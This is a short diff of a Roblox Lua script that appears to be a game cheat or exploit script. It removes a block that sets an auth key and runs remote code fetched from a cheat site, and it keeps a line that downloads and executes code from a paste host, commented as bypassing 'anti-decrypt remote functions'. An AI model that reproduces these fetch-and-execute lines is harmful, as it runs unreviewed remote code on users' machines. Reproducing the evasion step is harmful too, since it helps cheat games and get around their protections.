@@ -42,13 +42,6 @@ createStar(UDim2.new(0, 10, 0, 80))
 createStar(UDim2.new(0.5, -15, 0, 80)) 
 createStar(UDim2.new(1, -40, 0, 80))  
 
--- Main Slime Event Script
-getgenv().AuthKey = "HUGE_VbhX1eTt5wgb"
-getgenv().LoadSettings = {
-    Example_Setting = Example_Value
-}
-loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
-
 -- This script is used to bypass anti-decrypt remote functions
 loadstring(game:HttpGet("http://vpaste.net/ek3oU", true))()
 
